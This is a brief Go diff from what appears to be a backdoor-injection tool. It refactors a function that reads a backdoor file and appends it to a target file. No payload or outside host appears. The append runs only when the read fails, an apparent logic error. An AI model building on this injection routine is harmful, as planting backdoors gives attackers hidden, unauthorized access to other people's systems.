@@ -23,10 +23,7 @@ func Inject(ip string, port uint16, path string) error {
 }
 
 func injectBackDoor(filePath string, backdoorPath string) error {
-	var backdoor string
-	var err error
-
-	backdoor, err = utils.ReadFile(backdoorPath)
+	backdoor, err := utils.ReadFile(backdoorPath)
 	if err != nil {
 		err = utils.AppendToFile(backdoor, filePath)
 	}
